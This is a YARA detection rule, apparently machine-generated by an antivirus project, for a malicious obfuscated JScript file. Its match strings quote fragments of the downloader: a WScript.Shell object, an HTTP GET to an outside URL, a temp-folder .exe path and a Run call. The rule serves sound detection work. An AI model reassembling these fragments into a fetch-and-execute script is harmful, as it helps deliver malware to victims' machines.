rule sig_20160330_4628e1a2595807851079c783c29d7d16 {
  meta:
    description = "datamaliciousorder - file 20160330_4628e1a2595807851079c783c29d7d16.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ca3b35d627c6bab018c20f37a6c8cdf319f19347f16eeea076fb715f74760452"

  strings:
    $s1  = "var _ZP = function _CL() {return WScript[_F](\"WScript\"+\".Shell\");}(), _SW = 11;" fullword ascii
    $s2  = "_Z0[_Z](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s3  = "function _J(_Q, _EK){_I0 = _I0 * 1; return _Q - _EK;};" fullword ascii
    $s4  = "if (_Z0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _NC() {return _ZP[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"puRQxXpFzVrWobgk.ex\" + \"e\";};" fullword ascii
    $s6  = "function _B(){return _D + \"\";};" fullword ascii
    $s7  = "function _Y(_VI){_ZP[\"Run\"](_VI, _I0, _I0);};" fullword ascii
    $s8  = "function _H() {return ((_G == true) && (_G == _R1)) ? 1 : _I0;};" fullword ascii
    $s9  = "function _I()" fullword ascii
    $s10 = "function _LA(_YT) {var _V = (1, 2, 3, 4, 5, _YT); return _V;};" fullword ascii
    $s11 = "var _T0 = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_QM){" fullword ascii
    $s13 = "function _H0(){return _F;};" fullword ascii
    $s14 = "function _WK(){return 22;};" fullword ascii
    $s15 = "return _J(_W, _TY);" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "_G = true; " fullword ascii
    $s18 = "var _R1 = false;" fullword ascii
    $s19 = "_R1 = true; " fullword ascii
    $s20 = "var _JK = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}